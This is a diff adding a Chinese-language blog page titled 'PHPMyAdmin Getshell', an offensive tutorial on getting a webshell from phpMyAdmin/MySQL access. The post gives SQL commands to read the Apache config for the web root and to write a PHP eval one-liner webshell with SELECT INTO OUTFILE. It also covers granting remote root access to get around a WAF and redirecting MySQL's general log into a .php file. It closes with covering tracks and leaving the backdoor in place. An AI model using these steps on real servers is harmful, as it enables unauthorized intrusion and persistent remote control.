@@ -1,0 +1,137 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/logo.png?v=2.0.0" type="image/png" sizes="32x32"><meta name="description" content="测试通过PHPMyAdmin Getshell几种方法，以及如何绕过防护">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHPMyAdmin Getshell">
+<meta property="og:url" content="http://zege.red/2020/05/20/phpmyadmingetshell/index.html">
+<meta property="og:site_name" content="ZeGe&#39;s 专区">
+<meta property="og:description" content="测试通过PHPMyAdmin Getshell几种方法，以及如何绕过防护">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-05-20T14:16:03.468Z">
+<meta property="article:modified_time" content="2020-05-20T14:15:53.146Z">
+<meta property="article:author" content="ZeGe">
+<meta name="twitter:card" content="summary"><meta name="keywords" content="ZeGe, ZeGe's 专区"><meta name="description" content="Stay Zege"><title>PHPMyAdmin Getshell | ZeGe's 专区</title><link ref="canonical" href="http://zege.red/2020/05/20/phpmyadmingetshell/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.0.0"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">ZeGe's 专区</div><div class="header-banner-info__subtitle">好好学习 | 天天向上</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">PHPMyAdmin Getshell</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-05-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2020-05-20</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">487</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">阅读时长</span><span class="post-meta-item__value">3分</span></span></div></header><div class="post-body"><p>测试通过PHPMyAdmin Getshell几种方法，以及如何绕过防护</p>
+<a id="more"></a>
+
+        <h2 id="需求准备："   >
+          <a href="#需求准备：" class="heading-link"><i class="fas fa-link"></i></a>需求准备：</h2>
+      <p>1、找网站跟目录<br>2、查看系统防御<br>3、首先找免杀码</p>
+
+        <h3 id="通过select语句直接Getshell"   >
+          <a href="#通过select语句直接Getshell" class="heading-link"><i class="fas fa-link"></i></a>通过select语句直接Getshell</h3>
+      
+        <h4 id="找Mysql安装目录"   >
+          <a href="#找Mysql安装目录" class="heading-link"><i class="fas fa-link"></i></a>找Mysql安装目录</h4>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ select @@basedir;</span><br><span class="line"><span class="comment"># 可能是一个“D:/phpStudy/MySQL/”</span></span><br></pre></td></tr></table></div></figure>
+
+        <h4 id="通过Mysql目录推理中间件配置文件"   >
+          <a href="#通过Mysql目录推理中间件配置文件" class="heading-link"><i class="fas fa-link"></i></a>通过Mysql目录推理中间件配置文件</h4>
+      <p>根据mysql安装路径推理出apache配置文件位置（apache配置文件记录网站跟目录）</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># D:/phpStudy/apache/conf/httpd.conf</span></span><br><span class="line"><span class="comment"># D:/phpStudy/nginx/conf/httpd.conf</span></span><br></pre></td></tr></table></div></figure>
+
+        <h4 id="使用数据库读取配置文件内容"   >
+          <a href="#使用数据库读取配置文件内容" class="heading-link"><i class="fas fa-link"></i></a>使用数据库读取配置文件内容</h4>
+      <p>使用某个数据库，创建画一个表，用来记录读取的apache的配置文件</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ use mysql;</span><br><span class="line">$ create table xx(xx <span class="built_in">test</span>);</span><br><span class="line">$ load data infile <span class="string">"D:/phpStudy/apache/conf/httpd.conf"</span> into table xx;</span><br><span class="line">$ select xx</span><br><span class="line"><span class="comment"># 搜索documentroot关键字，查看路径：</span></span><br><span class="line"><span class="comment">## DocumentRoot "D:/phpStudy/WWW/xx.php"</span></span><br></pre></td></tr></table></div></figure>
+
+        <h4 id="导入一句话Shell"   >
+          <a href="#导入一句话Shell" class="heading-link"><i class="fas fa-link"></i></a>导入一句话Shell</h4>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>[a]);?&gt;"</span> into outfile <span class="string">'D:/phpStudy/WWW/xx.php'</span></span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="如果有waf会拦截导入shell"   >
+          <a href="#如果有waf会拦截导入shell" class="heading-link"><i class="fas fa-link"></i></a>如果有waf会拦截导入shell</h3>
+      
+        <h4 id="首先找免杀码，"   >
+          <a href="#首先找免杀码，" class="heading-link"><i class="fas fa-link"></i></a>首先找免杀码，</h4>
+      
+        <h4 id="开启外链，通过外部IP链接"   >
+          <a href="#开启外链，通过外部IP链接" class="heading-link"><i class="fas fa-link"></i></a>开启外链，通过外部IP链接</h4>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ Grant all privileges on *.* to <span class="string">'root'</span>@<span class="string">'%'</span>identified by <span class="string">'123.com'</span> with grant option;</span><br><span class="line"><span class="comment"># 客户端链接</span></span><br><span class="line">$ mysql.exe -h 1.1.1.1 -uroot -p</span><br><span class="line">输入密码：123.com</span><br></pre></td></tr></table></div></figure>
+
+        <h4 id="利用select语句Getshell"   >
+          <a href="#利用select语句Getshell" class="heading-link"><i class="fas fa-link"></i></a>利用select语句Getshell</h4>
+      <p>通过远程地址链接mysql服务器 然后执行sql语句导入一句话getshell</p>
+
+        <h4 id="菜刀链接"   >
+          <a href="#菜刀链接" class="heading-link"><i class="fas fa-link"></i></a>菜刀链接</h4>
+      
+        <h3 id="如果导出函数被禁用"   >
+          <a href="#如果导出函数被禁用" class="heading-link"><i class="fas fa-link"></i></a>如果导出函数被禁用</h3>
+      <p>禁用into outfile等等语句</p>
+
+        <h4 id="可以利用phpmyadmin漏洞getshell"   >
+          <a href="#可以利用phpmyadmin漏洞getshell" class="heading-link"><i class="fas fa-link"></i></a>可以利用phpmyadmin漏洞getshell</h4>
+      
+        <h4 id="可以利用phpmyadmin生成日志getshell"   >
+          <a href="#可以利用phpmyadmin生成日志getshell" class="heading-link"><i class="fas fa-link"></i></a>可以利用phpmyadmin生成日志getshell</h4>
+      
+        <h5 id="命令行方法"   >
+          <a href="#命令行方法" class="heading-link"><i class="fas fa-link"></i></a>命令行方法</h5>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ show variables like <span class="string">'log_bin'</span>     <span class="comment">#查看系统默认的文件目录</span></span><br><span class="line">$ <span class="built_in">set</span> global general_log=on;  <span class="comment">#开启记录日志</span></span><br><span class="line">$ <span class="built_in">set</span> global general_log=off; <span class="comment">#关闭</span></span><br><span class="line">$ <span class="built_in">set</span> global general_logg_file=<span class="string">'D:/phpStudy/WWW/xx.php'</span> <span class="comment">#修改生成日志的位置</span></span><br></pre></td></tr></table></div></figure>
+
+        <h5 id="图形化方法"   >
+          <a href="#图形化方法" class="heading-link"><i class="fas fa-link"></i></a>图形化方法</h5>
+      
+        <h6 id="备份历史的路径，以便还原，一定要记录"   >
+          <a href="#备份历史的路径，以便还原，一定要记录" class="heading-link"><i class="fas fa-link"></i></a>备份历史的路径，以便还原，一定要记录</h6>
+      
+        <h6 id="修改文件到网站跟目录生成一个php文件"   >
+          <a href="#修改文件到网站跟目录生成一个php文件" class="heading-link"><i class="fas fa-link"></i></a>修改文件到网站跟目录生成一个php文件</h6>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:/phpStudy/WWW/xx.php</span><br></pre></td></tr></table></div></figure>
+
+        <h6 id="然后利用sql语句导入"   >
+          <a href="#然后利用sql语句导入" class="heading-link"><i class="fas fa-link"></i></a>然后利用sql语句导入</h6>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ select <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>[a]);?&gt;"</span>;</span><br></pre></td></tr></table></div></figure>
+
+        <h6 id="然后访问生成的WebShell"   >
+          <a href="#然后访问生成的WebShell" class="heading-link"><i class="fas fa-link"></i></a>然后访问生成的WebShell</h6>
+      
+        <h6 id="将路径还原，记录日志关闭改为OFF"   >
+          <a href="#将路径还原，记录日志关闭改为OFF" class="heading-link"><i class="fas fa-link"></i></a>将路径还原，记录日志关闭改为OFF</h6>
+      
+        <h6 id="留好………大家都懂"   >
+          <a href="#留好………大家都懂" class="heading-link"><i class="fas fa-link"></i></a>留好………大家都懂</h6>
+      </div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://zege.red">ZeGe</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://zege.red/2020/05/20/phpmyadmingetshell/">http://zege.red/2020/05/20/phpmyadmingetshell/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2020/05/20/dllbypass/"><span class="paginator-prev__text">Webshell之Bypass</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#需求准备："><span class="toc-number">1.</span> <span class="toc-text">
+          需求准备：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通过select语句直接Getshell"><span class="toc-number">1.1.</span> <span class="toc-text">
+          通过select语句直接Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#找Mysql安装目录"><span class="toc-number">1.1.1.</span> <span class="toc-text">
+          找Mysql安装目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通过Mysql目录推理中间件配置文件"><span class="toc-number">1.1.2.</span> <span class="toc-text">
+          通过Mysql目录推理中间件配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用数据库读取配置文件内容"><span class="toc-number">1.1.3.</span> <span class="toc-text">
+          使用数据库读取配置文件内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#导入一句话Shell"><span class="toc-number">1.1.4.</span> <span class="toc-text">
+          导入一句话Shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如果有waf会拦截导入shell"><span class="toc-number">1.2.</span> <span class="toc-text">
+          如果有waf会拦截导入shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#首先找免杀码，"><span class="toc-number">1.2.1.</span> <span class="toc-text">
+          首先找免杀码，</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开启外链，通过外部IP链接"><span class="toc-number">1.2.2.</span> <span class="toc-text">
+          开启外链，通过外部IP链接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用select语句Getshell"><span class="toc-number">1.2.3.</span> <span class="toc-text">
+          利用select语句Getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#菜刀链接"><span class="toc-number">1.2.4.</span> <span class="toc-text">
+          菜刀链接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如果导出函数被禁用"><span class="toc-number">1.3.</span> <span class="toc-text">
+          如果导出函数被禁用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#可以利用phpmyadmin漏洞getshell"><span class="toc-number">1.3.1.</span> <span class="toc-text">
+          可以利用phpmyadmin漏洞getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#可以利用phpmyadmin生成日志getshell"><span class="toc-number">1.3.2.</span> <span class="toc-text">
+          可以利用phpmyadmin生成日志getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#命令行方法"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">
+          命令行方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#图形化方法"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">
+          图形化方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#备份历史的路径，以便还原，一定要记录"><span class="toc-number">1.3.2.2.1.</span> <span class="toc-text">
+          备份历史的路径，以便还原，一定要记录</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#修改文件到网站跟目录生成一个php文件"><span class="toc-number">1.3.2.2.2.</span> <span class="toc-text">
+          修改文件到网站跟目录生成一个php文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#然后利用sql语句导入"><span class="toc-number">1.3.2.2.3.</span> <span class="toc-text">
+          然后利用sql语句导入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#然后访问生成的WebShell"><span class="toc-number">1.3.2.2.4.</span> <span class="toc-text">
+          然后访问生成的WebShell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#将路径还原，记录日志关闭改为OFF"><span class="toc-number">1.3.2.2.5.</span> <span class="toc-text">
+          将路径还原，记录日志关闭改为OFF</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#留好………大家都懂"><span class="toc-number">1.3.2.2.6.</span> <span class="toc-text">
+          留好………大家都懂</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/zege.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">学习使我快乐!</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020~2080</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>ZeGe</span><span class="footer__devider">|</span><span>晋ICP备 20003408 号</span></div><div>Email 1499005784@qq.com</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.0.0"></script><script src="/js/stun-boot.js?v=2.0.0"></script><script src="/js/scroll.js?v=2.0.0"></script><script src="/js/header.js?v=2.0.0"></script><script src="/js/sidebar.js?v=2.0.0"></script></body></html>
